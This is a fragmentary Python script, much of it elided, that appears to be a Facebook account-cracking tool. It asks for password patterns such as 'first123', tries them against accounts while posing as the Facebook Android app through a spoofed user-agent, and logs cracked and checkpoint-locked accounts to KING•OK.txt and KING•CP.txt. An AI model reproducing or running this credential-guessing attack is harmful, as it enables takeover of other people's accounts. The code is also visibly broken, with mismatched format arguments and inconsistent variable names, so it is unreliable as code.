...
try:
    ...
    print('\n [\033[1;32m✓\033[1;37m] installing futures !...\n')
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mKING•OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mKING•CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back KING Menu ")
	    alamin()
...
class __xxx__:
        ...
        try:
            for pw in __chi__:
                ...
                header1 = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 13; RMX3561 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/407.0.0.30.97;]",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            os.system("clear")
            print(logo)
            print("\033[1;37m\rInput Password List \033[1;37m\n")
            print("\033[1;31mExample : \033[1;37m \n \033[1;32mFirstlast,first123,first last\033[1;37m")
            p1 = input(' Password 1 : ')
            p2 = input(' Password 2 : ')
            p3 = input(' Password 3 : ')
            os.system("clear")
